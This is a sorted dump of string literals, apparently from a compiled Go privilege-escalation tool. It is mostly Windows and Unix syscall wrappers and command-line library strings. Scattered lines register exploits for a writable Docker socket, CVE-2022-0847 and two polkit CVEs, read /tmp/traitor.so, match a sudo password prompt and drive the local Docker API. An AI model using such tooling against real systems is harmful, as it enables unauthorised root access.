"r1, _, e1 := syscall.Syscall6(procConvertStringSecurityDescriptorToSecurityDescriptorW.Addr(), 4, uintptr(unsafe.Pointer(str)), uintptr(revision), uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(size)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procCreatePipe.Addr(), 4, uintptr(unsafe.Pointer(readhandle)), uintptr(unsafe.Pointer(writehandle)), uintptr(unsafe.Pointer(sa)), uintptr(size), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procCreateWellKnownSid.Addr(), 4, uintptr(sidType), uintptr(unsafe.Pointer(domainSid)), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(sizeSid)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procCryptAcquireCertificatePrivateKey.Addr(), 6, uintptr(unsafe.Pointer(cert)), uintptr(flags), uintptr(parameters), uintptr(unsafe.Pointer(cryptProvOrNCryptKey)), uintptr(unsafe.Pointer(keySpec)), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall6(procCryptAcquireContextW.Addr(), 5, uintptr(unsafe.Pointer(provhandle)), uintptr(unsafe.Pointer(container)), uintptr(unsafe.Pointer(provider)), uintptr(provtype), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall6(procDuplicateTokenEx.Addr(), 6, uintptr(existingToken), uintptr(desiredAccess), uintptr(unsafe.Pointer(tokenAttributes)), uintptr(impersonationLevel), uintptr(tokenType), uintptr(unsafe.Pointer(newToken)))"
"r1, _, e1 := syscall.Syscall6(procEnumProcessModules.Addr(), 4, uintptr(process), uintptr(unsafe.Pointer(module)), uintptr(cb), uintptr(unsafe.Pointer(cbNeeded)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procEnumProcessModulesEx.Addr(), 5, uintptr(process), uintptr(unsafe.Pointer(module)), uintptr(cb), uintptr(unsafe.Pointer(cbNeeded)), uintptr(filterFlag), 0)"
"r1, _, e1 := syscall.Syscall6(procGetDiskFreeSpaceExW.Addr(), 4, uintptr(unsafe.Pointer(directoryName)), uintptr(unsafe.Pointer(freeBytesAvailableToCaller)), uintptr(unsafe.Pointer(totalNumberOfBytes)), uintptr(unsafe.Pointer(totalNumberOfFreeBytes)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetFileInformationByHandleEx.Addr(), 4, uintptr(handle), uintptr(class), uintptr(unsafe.Pointer(outBuffer)), uintptr(outBufferLen), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetFileVersionInfoW.Addr(), 4, uintptr(unsafe.Pointer(filename)), uintptr(handle), uintptr(bufSize), uintptr(buffer), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetModuleBaseNameW.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(baseName)), uintptr(size), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetModuleFileNameExW.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(filename)), uintptr(size), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetModuleInformation.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(modinfo)), uintptr(cb), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetNamedPipeInfo.Addr(), 5, uintptr(pipe), uintptr(unsafe.Pointer(flags)), uintptr(unsafe.Pointer(outSize)), uintptr(unsafe.Pointer(inSize)), uintptr(unsafe.Pointer(maxInstances)), 0)"
"r1, _, e1 := syscall.Syscall6(procGetOverlappedResult.Addr(), 4, uintptr(handle), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(done)), uintptr(_p0), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetProcessPreferredUILanguages.Addr(), 4, uintptr(flags), uintptr(unsafe.Pointer(numLanguages)), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(bufSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetProcessTimes.Addr(), 5, uintptr(handle), uintptr(unsafe.Pointer(creationTime)), uintptr(unsafe.Pointer(exitTime)), uintptr(unsafe.Pointer(kernelTime)), uintptr(unsafe.Pointer(userTime)), 0)"
"r1, _, e1 := syscall.Syscall6(procGetQueuedCompletionStatus.Addr(), 5, uintptr(cphandle), uintptr(unsafe.Pointer(qty)), uintptr(unsafe.Pointer(key)), uintptr(unsafe.Pointer(overlapped)), uintptr(timeout), 0)"
"r1, _, e1 := syscall.Syscall6(procGetSecurityDescriptorDacl.Addr(), 4, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall6(procGetSecurityDescriptorSacl.Addr(), 4, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer("
"r1, _, e1 := syscall.Syscall6(procGetSystemPreferredUILanguages.Addr(), 4, uintptr(flags), uintptr(unsafe.Pointer(numLanguages)), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(bufSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetThreadPreferredUILanguages.Addr(), 4, uintptr(flags), uintptr(unsafe.Pointer(numLanguages)), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(bufSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetTokenInformation.Addr(), 5, uintptr(token), uintptr(infoClass), uintptr(unsafe.Pointer(info)), uintptr(infoLen), uintptr(unsafe.Pointer(returnedLen)), 0)"
"r1, _, e1 := syscall.Syscall6(procGetUserPreferredUILanguages.Addr(), 4, uintptr(flags), uintptr(unsafe.Pointer(numLanguages)), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(bufSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procGetVolumePathNamesForVolumeNameW.Addr(), 4, uintptr(unsafe.Pointer(volumeName)), uintptr(unsafe.Pointer(volumePathNames)), uintptr(bufferLength), uintptr(unsafe.Pointer(returnLength)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procInitializeProcThreadAttributeList.Addr(), 4, uintptr(unsafe.Pointer(attrlist)), uintptr(attrcount), uintptr(flags), uintptr(unsafe.Pointer(size)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procInitiateSystemShutdownExW.Addr(), 6, uintptr(unsafe.Pointer(machineName)), uintptr(unsafe.Pointer(message)), uintptr(timeout), uintptr(_p0), uintptr(_p1), uintptr(reason))"
"r1, _, e1 := syscall.Syscall6(procLockFileEx.Addr(), 6, uintptr(file), uintptr(flags), uintptr(reserved), uintptr(bytesLow), uintptr(bytesHigh), uintptr(unsafe.Pointer(overlapped)))"
"r1, _, e1 := syscall.Syscall6(procOpenThreadToken.Addr(), 4, uintptr(thread), uintptr(access), uintptr(_p0), uintptr(unsafe.Pointer(token)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procPostQueuedCompletionStatus.Addr(), 4, uintptr(cphandle), uintptr(qty), uintptr(key), uintptr(unsafe.Pointer(overlapped)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procQueryFullProcessImageNameW.Addr(), 4, uintptr(proc), uintptr(flags), uintptr(unsafe.Pointer(exeName)), uintptr(unsafe.Pointer(size)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procQueryInformationJobObject.Addr(), 5, uintptr(job), uintptr(JobObjectInformationClass), uintptr(JobObjectInformation), uintptr(JobObjectInformationLength), uintptr(unsafe.Pointer(retlen)), 0)"
"r1, _, e1 := syscall.Syscall6(procQueryServiceConfig2W.Addr(), 5, uintptr(service), uintptr(infoLevel), uintptr(unsafe.Pointer(buff)), uintptr(buffSize), uintptr(unsafe.Pointer(bytesNeeded)), 0)"
"r1, _, e1 := syscall.Syscall6(procQueryServiceConfigW.Addr(), 4, uintptr(service), uintptr(unsafe.Pointer(serviceConfig)), uintptr(bufSize), uintptr(unsafe.Pointer(bytesNeeded)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procQueryServiceLockStatusW.Addr(), 4, uintptr(mgr), uintptr(unsafe.Pointer(lockStatus)), uintptr(bufSize), uintptr(unsafe.Pointer(bytesNeeded)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procQueryServiceStatusEx.Addr(), 5, uintptr(service), uintptr(infoLevel), uintptr(unsafe.Pointer(buff)), uintptr(buffSize), uintptr(unsafe.Pointer(bytesNeeded)), 0)"
"r1, _, e1 := syscall.Syscall6(procReadConsoleW.Addr(), 5, uintptr(console), uintptr(unsafe.Pointer(buf)), uintptr(toread), uintptr(unsafe.Pointer(read)), uintptr(unsafe.Pointer(inputControl)), 0)"
"r1, _, e1 := syscall.Syscall6(procReadFile.Addr(), 5, uintptr(handle), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(unsafe.Pointer(done)), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall6(procReadProcessMemory.Addr(), 5, uintptr(process), uintptr(baseAddress), uintptr(unsafe.Pointer(buffer)), uintptr(size), uintptr(unsafe.Pointer(numberOfBytesRead)), 0)"
"r1, _, e1 := syscall.Syscall6(procSetFileInformationByHandle.Addr(), 4, uintptr(handle), uintptr(class), uintptr(unsafe.Pointer(inBuffer)), uintptr(inBufferLen), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetFileTime.Addr(), 4, uintptr(handle), uintptr(unsafe.Pointer(ctime)), uintptr(unsafe.Pointer(atime)), uintptr(unsafe.Pointer(wtime)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetNamedPipeHandleState.Addr(), 4, uintptr(pipe), uintptr(unsafe.Pointer(state)), uintptr(unsafe.Pointer(maxCollectionCount)), uintptr(unsafe.Pointer(collectDataTimeout)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetProcessWorkingSetSizeEx.Addr(), 4, uintptr(hProcess), uintptr(dwMinimumWorkingSetSize), uintptr(dwMaximumWorkingSetSize), uintptr(flags), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetSecurityDescriptorDacl.Addr(), 4, uintptr(unsafe.Pointer(sd)), uintptr(_p0), uintptr(unsafe.Pointer(dacl)), uintptr(_p1), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetSecurityDescriptorSacl.Addr(), 4, uintptr(unsafe.Pointer(sd)), uintptr(_p0), uintptr(unsafe.Pointer(sacl)), uintptr(_p1), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetTokenInformation.Addr(), 4, uintptr(token), uintptr(infoClass), uintptr(unsafe.Pointer(info)), uintptr(infoLen), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetupDiClassGuidsFromNameExW.Addr(), 6, uintptr(unsafe.Pointer(className)), uintptr(unsafe.Pointer(classGuidList)), uintptr(classGuidListSize), uintptr(unsafe.Pointer(requiredSize)), uintptr(unsafe.Pointer(machineName)), uintptr(reserved))"
"r1, _, e1 := syscall.Syscall6(procSetupDiClassNameFromGuidExW.Addr(), 6, uintptr(unsafe.Pointer(classGUID)), uintptr(unsafe.Pointer(className)), uintptr(classNameSize), uintptr(unsafe.Pointer(requiredSize)), uintptr(unsafe.Pointer(machineName)), uintptr(reserved))"
"r1, _, e1 := syscall.Syscall6(procSetupDiEnumDriverInfoW.Addr(), 5, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(driverType), uintptr(memberIndex), uintptr(unsafe.Pointer(driverInfoData)), 0)"
"r1, _, e1 := syscall.Syscall6(procSetupDiGetClassInstallParamsW.Addr(), 5, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(classInstallParams)), uintptr(classInstallParamsSize), uintptr(unsafe.Pointer(requiredSize)), 0)"
"r1, _, e1 := syscall.Syscall6(procSetupDiGetDeviceInstanceIdW.Addr(), 5, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(instanceId)), uintptr(instanceIdSize), uintptr(unsafe.Pointer(instanceIdRequiredSize)), 0)"
"r1, _, e1 := syscall.Syscall6(procSetupDiGetDriverInfoDetailW.Addr(), 6, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(driverInfoData)), uintptr(unsafe.Pointer(driverInfoDetailData)), uintptr(driverInfoDetailDataSize), uintptr(unsafe.Pointer(requiredSize)))"
"r1, _, e1 := syscall.Syscall6(procSetupDiSetClassInstallParamsW.Addr(), 4, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(classInstallParams)), uintptr(classInstallParamsSize), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procSetupDiSetDeviceRegistryPropertyW.Addr(), 5, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(property), uintptr(unsafe.Pointer(propertyBuffer)), uintptr(propertyBufferSize), 0)"
"r1, _, e1 := syscall.Syscall6(procShellExecuteW.Addr(), 6, uintptr(hwnd), uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)), uintptr(unsafe.Pointer(args)), uintptr(unsafe.Pointer(cwd)), uintptr(showCmd))"
"r1, _, e1 := syscall.Syscall6(procTranslateNameW.Addr(), 5, uintptr(unsafe.Pointer(accName)), uintptr(accNameFormat), uintptr(desiredNameFormat), uintptr(unsafe.Pointer(translatedName)), uintptr(unsafe.Pointer(nSize)), 0)"
"r1, _, e1 := syscall.Syscall6(procUnlockFileEx.Addr(), 5, uintptr(file), uintptr(reserved), uintptr(bytesLow), uintptr(bytesHigh), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall6(procVerQueryValueW.Addr(), 4, uintptr(block), uintptr(unsafe.Pointer(subBlock)), uintptr(pointerToBufferPointer), uintptr(unsafe.Pointer(bufSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procVirtualProtect.Addr(), 4, uintptr(address), uintptr(size), uintptr(newprotect), uintptr(unsafe.Pointer(oldprotect)), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procVirtualProtectEx.Addr(), 5, uintptr(process), uintptr(address), uintptr(size), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)), 0)"
"r1, _, e1 := syscall.Syscall6(procVirtualQueryEx.Addr(), 4, uintptr(process), uintptr(address), uintptr(unsafe.Pointer(buffer)), uintptr(length), 0, 0)"
"r1, _, e1 := syscall.Syscall6(procWSAGetOverlappedResult.Addr(), 5, uintptr(h), uintptr(unsafe.Pointer(o)), uintptr(unsafe.Pointer(bytes)), uintptr(_p0), uintptr(unsafe.Pointer(flags)), 0)"
"r1, _, e1 := syscall.Syscall6(procWTSEnumerateSessionsW.Addr(), 5, uintptr(handle), uintptr(reserved), uintptr(version), uintptr(unsafe.Pointer(sessions)), uintptr(unsafe.Pointer(count)), 0)"
"r1, _, e1 := syscall.Syscall6(procWriteConsoleW.Addr(), 5, uintptr(console), uintptr(unsafe.Pointer(buf)), uintptr(towrite), uintptr(unsafe.Pointer(written)), uintptr(unsafe.Pointer(reserved)), 0)"
"r1, _, e1 := syscall.Syscall6(procWriteFile.Addr(), 5, uintptr(handle), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(unsafe.Pointer(done)), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(process), uintptr(baseAddress), uintptr(unsafe.Pointer(buffer)), uintptr(size), uintptr(unsafe.Pointer(numberOfBytesWritten)), 0)"
"r1, _, e1 := syscall.Syscall6(procgetsockopt.Addr(), 5, uintptr(s), uintptr(level), uintptr(optname), uintptr(unsafe.Pointer(optval)), uintptr(unsafe.Pointer(optlen)), 0)"
"r1, _, e1 := syscall.Syscall6(procsendto.Addr(), 6, uintptr(s), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(flags), uintptr(to), uintptr(tolen))"
"r1, _, e1 := syscall.Syscall6(procsetsockopt.Addr(), 5, uintptr(s), uintptr(level), uintptr(optname), uintptr(unsafe.Pointer(optval)), uintptr(optlen), 0)"
"r1, _, e1 := syscall.Syscall6(sendRecvMsgFunc.recvAddr, 5, uintptr(fd), uintptr(unsafe.Pointer(msg)), uintptr(unsafe.Pointer(bytesReceived)), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)), 0)"
"r1, _, e1 := syscall.Syscall6(sendRecvMsgFunc.sendAddr, 6, uintptr(fd), uintptr(unsafe.Pointer(msg)), uintptr(flags), uintptr(unsafe.Pointer(bytesSent)), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)))"
"r1, _, e1 := syscall.Syscall9(connectExFunc.addr, 7, uintptr(s), uintptr(name), uintptr(namelen), uintptr(unsafe.Pointer(sendBuf)), uintptr(sendDataLen), uintptr(unsafe.Pointer(bytesSent)), uintptr(unsafe.Pointer(overlapped)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procAcceptEx.Addr(), 8, uintptr(ls), uintptr(as), uintptr(unsafe.Pointer(buf)), uintptr(rxdatalen), uintptr(laddrlen), uintptr(raddrlen), uintptr(unsafe.Pointer(recvd)), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall9(procCertGetCertificateChain.Addr(), 8, uintptr(engine), uintptr(unsafe.Pointer(leaf)), uintptr(unsafe.Pointer(time)), uintptr(additionalStore), uintptr(unsafe.Pointer(para)), uintptr(flags), uintptr(reserved), uintptr(unsafe.Pointer(chainCtx)), 0)"
"r1, _, e1 := syscall.Syscall9(procCryptDecodeObject.Addr(), 7, uintptr(encodingType), uintptr(unsafe.Pointer(structType)), uintptr(unsafe.Pointer(encodedBytes)), uintptr(lenEncodedBytes), uintptr(flags), uintptr(decoded), uintptr(unsafe.Pointer(decodedLen)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procCryptProtectData.Addr(), 7, uintptr(unsafe.Pointer(dataIn)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(optionalEntropy)), uintptr(reserved), uintptr(unsafe.Pointer(promptStruct)), uintptr(flags), uintptr(unsafe.Pointer(dataOut)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procCryptUnprotectData.Addr(), 7, uintptr(unsafe.Pointer(dataIn)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(optionalEntropy)), uintptr(reserved), uintptr(unsafe.Pointer(promptStruct)), uintptr(flags), uintptr(unsafe.Pointer(dataOut)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procDeviceIoControl.Addr(), 8, uintptr(handle), uintptr(ioControlCode), uintptr(unsafe.Pointer(inBuffer)), uintptr(inBufferSize), uintptr(unsafe.Pointer(outBuffer)), uintptr(outBufferSize), uintptr(unsafe.Pointer(bytesReturned)), uintptr(unsafe.Pointer(overlapped)), 0)"
"r1, _, e1 := syscall.Syscall9(procDuplicateHandle.Addr(), 7, uintptr(hSourceProcessHandle), uintptr(hSourceHandle), uintptr(hTargetProcessHandle), uintptr(unsafe.Pointer(lpTargetHandle)), uintptr(dwDesiredAccess), uintptr(_p0), uintptr(dwOptions), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procGetNamedPipeHandleStateW.Addr(), 7, uintptr(pipe), uintptr(unsafe.Pointer(state)), uintptr(unsafe.Pointer(curInstances)), uintptr(unsafe.Pointer(maxCollectionCount)), uintptr(unsafe.Pointer(collectDataTimeout)), uintptr(unsafe.Pointer(userName)), uintptr(maxUserNameSize), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procGetVolumeInformationByHandleW.Addr(), 8, uintptr(file), uintptr(unsafe.Pointer(volumeNameBuffer)), uintptr(volumeNameSize), uintptr(unsafe.Pointer(volumeNameSerialNumber)), uintptr(unsafe.Pointer(maximumComponentLength)), uintptr(unsafe.Pointer(fileSystemFlags)), uintptr(unsafe.Pointer(fileSystemNameBuffer)), uintptr(fileSystemNameSize), 0)"
"r1, _, e1 := syscall.Syscall9(procGetVolumeInformationW.Addr(), 8, uintptr(unsafe.Pointer(rootPathName)), uintptr(unsafe.Pointer(volumeNameBuffer)), uintptr(volumeNameSize), uintptr(unsafe.Pointer(volumeNameSerialNumber)), uintptr(unsafe.Pointer(maximumComponentLength)), uintptr(unsafe.Pointer(fileSystemFlags)), uintptr(unsafe.Pointer(fileSystemNameBuffer)), uintptr(fileSystemNameSize), 0)"
"r1, _, e1 := syscall.Syscall9(procLookupAccountNameW.Addr(), 7, uintptr(unsafe.Pointer(systemName)), uintptr(unsafe.Pointer(accountName)), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(sidLen)), uintptr(unsafe.Pointer(refdDomainName)), uintptr(unsafe.Pointer(refdDomainNameLen)), uintptr(unsafe.Pointer(use)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procLookupAccountSidW.Addr(), 7, uintptr(unsafe.Pointer(systemName)), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(nameLen)), uintptr(unsafe.Pointer(refdDomainName)), uintptr(unsafe.Pointer(refdDomainNameLen)), uintptr(unsafe.Pointer(use)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procReadDirectoryChangesW.Addr(), 8, uintptr(handle), uintptr(unsafe.Pointer(buf)), uintptr(buflen), uintptr(_p0), uintptr(mask), uintptr(unsafe.Pointer(retlen)), uintptr(unsafe.Pointer(overlapped)), uintptr(completionRoutine), 0)"
"r1, _, e1 := syscall.Syscall9(procReportEventW.Addr(), 9, uintptr(log), uintptr(etype), uintptr(category), uintptr(eventId), uintptr(usrSId), uintptr(numStrings), uintptr(dataSize), uintptr(unsafe.Pointer(strings)), uintptr(unsafe.Pointer(rawData)))"
"r1, _, e1 := syscall.Syscall9(procSetupDiCreateDeviceInfoW.Addr(), 7, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(DeviceName)), uintptr(unsafe.Pointer(classGUID)), uintptr(unsafe.Pointer(DeviceDescription)), uintptr(hwndParent), uintptr(CreationFlags), uintptr(unsafe.Pointer(deviceInfoData)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procSetupDiGetDevicePropertyW.Addr(), 8, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(unsafe.Pointer(propertyKey)), uintptr(unsafe.Pointer(propertyType)), uintptr(unsafe.Pointer(propertyBuffer)), uintptr(propertyBufferSize), uintptr(unsafe.Pointer(requiredSize)), uintptr(flags), 0)"
"r1, _, e1 := syscall.Syscall9(procSetupDiGetDeviceRegistryPropertyW.Addr(), 7, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(property), uintptr(unsafe.Pointer(propertyRegDataType)), uintptr(unsafe.Pointer(propertyBuffer)), uintptr(propertyBufferSize), uintptr(unsafe.Pointer(requiredSize)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procTransmitFile.Addr(), 7, uintptr(s), uintptr(handle), uintptr(bytesToWrite), uintptr(bytsPerSend), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(transmitFileBuf)), uintptr(flags), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procUpdateProcThreadAttribute.Addr(), 7, uintptr(unsafe.Pointer(attrlist)), uintptr(flags), uintptr(attr), uintptr(value), uintptr(size), uintptr(prevvalue), uintptr(unsafe.Pointer(returnedsize)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procWSAIoctl.Addr(), 9, uintptr(s), uintptr(iocc), uintptr(unsafe.Pointer(inbuf)), uintptr(cbif), uintptr(unsafe.Pointer(outbuf)), uintptr(cbob), uintptr(unsafe.Pointer(cbbr)), uintptr(unsafe.Pointer(overlapped)), uintptr(completionRoutine))"
"r1, _, e1 := syscall.Syscall9(procWSARecv.Addr(), 7, uintptr(s), uintptr(unsafe.Pointer(bufs)), uintptr(bufcnt), uintptr(unsafe.Pointer(recvd)), uintptr(unsafe.Pointer(flags)), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procWSARecvFrom.Addr(), 9, uintptr(s), uintptr(unsafe.Pointer(bufs)), uintptr(bufcnt), uintptr(unsafe.Pointer(recvd)), uintptr(unsafe.Pointer(flags)), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)))"
"r1, _, e1 := syscall.Syscall9(procWSASend.Addr(), 7, uintptr(s), uintptr(unsafe.Pointer(bufs)), uintptr(bufcnt), uintptr(unsafe.Pointer(sent)), uintptr(flags), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)), 0, 0)"
"r1, _, e1 := syscall.Syscall9(procWSASendTo.Addr(), 9, uintptr(s), uintptr(unsafe.Pointer(bufs)), uintptr(bufcnt), uintptr(unsafe.Pointer(sent)), uintptr(flags), uintptr(unsafe.Pointer(to)), uintptr(tolen), uintptr(unsafe.Pointer(overlapped)), uintptr(unsafe.Pointer(croutine)))"
"r1, _, e1 = rawSyscall6(uintptr(unsafe.Pointer("
"r1, _, e1 = syscall6(uintptr(unsafe.Pointer("
"rGID: int32(os.Getgid()),"
"rUID: int32(os.Getuid()),"
"r[sudo] password: "")"
"raceReadRange(unsafe.Pointer(iovecs[i].Base), m)"
"raceWriteRange(unsafe.Pointer(iovecs[i].Base), m)"
"rawSO, err := ioutil.ReadFile(""/tmp/traitor.so"")"
"rawSyscall6(SB),NOSPLIT,$0-88"
"rawSysvicall6(SB),NOSPLIT,$0-88"
"rawsocketcall(SB),NOSPLIT,$0-36"
"rdbbuf := make([]byte, MAXIMUM_REPARSE_DATA_BUFFER_SIZE)"
"rdbbuf[0], uint32(len(rdbbuf)), "
"read(fd int, p []byte) (n int, err error)"
"read(int fd, void "
"readFile(handle Handle, buf []byte, done "
"readdir_r(dir uintptr, entry "
"readlen(fd int, buf "
"readlen(fd int, p "
"readlinkat(int fd, const char "
"readv(fd int, iovs []Iovec) (n int, err error) = SYS_READV"
"readv(fd int, iovs []Iovec) (n int, err error)"
"readv(int fd, const struct iovec "
"readvRacedetect(iovecs, n, err)"
"reboot(int opt, char "
"reboot(magic1 uint, magic2 uint, cmd int, arg string) (err error)"
"reclen, ok := direntReclen(buf)"
"record, u_int length)"
"records := make([]string, 0, len("
"records = append(records, k"
"recvfrom(fd int, p []byte, flags int, from "
"recvfrom(int s, void "
"recvfrom(s Handle, buf []byte, flags int32, from "
"recvmmsg(int s, struct mmsghdr "
"recvmsg(int s, struct msghdr "
"recvmsg(s int, msg "
"register(""docker:writable-socket"", SpeedFast, dockersock.New())"
"register(""kernel:CVE-2022-0847"", SpeedFast, cve20220847.New())"
"register(""polkit:CVE-2021-3560"", SpeedFast, cve20213560.New())"
"register(""polkit:CVE-2021-4034"", SpeedFast, cve20214034.New())"
"registeredVulnerabilities = append(registeredVulnerabilities, Registration{"
"removexattr(path string, attr string, options int) (err error)"
"renameat(int fromfd, const char "
"req, err := http.NewRequest(http.MethodDelete, fmt.Sprintf(""http://localhost/containers/%s"
"req, err := http.NewRequest(http.MethodDelete, fmt.Sprintf(""http://localhost/images/%s"
"reqSize, 0)"
"reqSize, machineNameUTF16, 0)"
"required flag(s) ""%s"" not set"
"requiredAnnotation, found := pflag.Annotations[BashCompOneRequiredFlag]"
"requiredAsGroup   = ""cobra_annotation_required_if_others_set"""
"resData, err := LoadResource(module, resInfo)"
"resInfo, err := findResource(module, namePtr, resTypePtr)"
"resTypePtr, err = resolvePtr(resType, "
"resolvePtr := func(i interface{}, keep "
"resp, err := v.client.Do(req)"
"resp, err := v.client.Get("
"resp, err := v.client.Post("
"resp, err := v.client.Post(""http://localhost/containers/create"", ""application/json"", strings.NewReader(creationData))"
"respStart, err := v.client.Post(fmt.Sprintf(""http://localhost/containers/%s/start"", container.ID), ""application/json"", nil)"
"result := make([]int64, len(v.segments))"
"result, err := convFunc(sval)"
"ret := cm_Get_DevNode_Status(status, problemNumber, devInst, flags)"
"ret := make([]uint16, 100)"
"ret = append(ret, args[:i]...)"
"ret = append(ret, args[i"
"ret = append(ret, buf[0])"
"ret = make([]uint16, n)"
"ret, _, err := Syscall(SYS_IOCTL, uintptr(fd), uintptr(req), 0)"
"ret, _, err := Syscall6(SYS_PRCTL, uintptr(option), uintptr(arg2), uintptr(arg3), uintptr(arg4), uintptr(arg5), 0)"
"ret[0], uint32(len(ret)))"
"return """
"return """""
"return """", """", 0, e"
"return """", """", 0, err"
"return """", EFAULT"
"return """", EINVAL"
"return """", ENOENT"
"return """", b, false"
"return """", e"
"return """", err"
"return """", errors.New(""FIODGNAME string not NUL-terminated"")"
"return """", errors.New(""TIOCPTSNAME string not NUL-terminated"")"
"return """", errors.New(""TIOCPTYGNAME string not NUL-terminated"")"
"return """", false"
"return """", fmt.Errorf(""no writable directory found"")"
"return """", io.EOF"
"return """", nil"
"return """", syscall.EINVAL"
"return ""-"" "
"return ""/dev/pts/"" "
"return ""Future"""
"return ""Group"""
"return ""Invalid"""
"return ""Microsoft"""
"return ""Org"""
"return ""Person"""
"return ""RFC4122"""
"return ""Reserved"""
"return ""Subcommand '"" "
"return ""["" "
"return ""bool"""
"return ""boolSlice"""
"return ""bytesBase64"""
"return ""bytesHex"""
"return ""count"""
"return ""duration"""
"return ""durationSlice"""
"return ""explorer.exe"" == syscall.UTF16ToString(pe.ExeFile[:])"
"return ""float32"""
"return ""float32Slice"""
"return ""float64"""
"return ""float64Slice"""
"return ""int"""
"return ""int16"""
"return ""int32"""
"return ""int32Slice"""
"return ""int64"""
"return ""int64Slice"""
"return ""int8"""
"return ""intSlice"""
"return ""ip"""
"return ""ipMask"""
"return ""ipNet"""
"return ""ipSlice"""
